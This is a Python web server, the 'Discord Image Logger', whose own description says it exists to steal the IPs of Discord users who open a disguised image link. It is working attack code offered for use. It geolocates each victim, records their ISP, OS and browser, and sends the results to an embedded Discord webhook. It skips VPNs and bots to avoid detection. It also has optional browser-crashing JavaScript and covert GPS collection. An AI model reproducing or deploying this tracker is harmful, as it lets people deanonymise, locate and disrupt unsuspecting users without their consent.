# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1222915578683986020/2oVphkA0rcxqJlUu4oCAc_Wov1uJj5Wj2kckUYVQFnkQC2714z7qTsXD9O1nVMkeDYrI",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
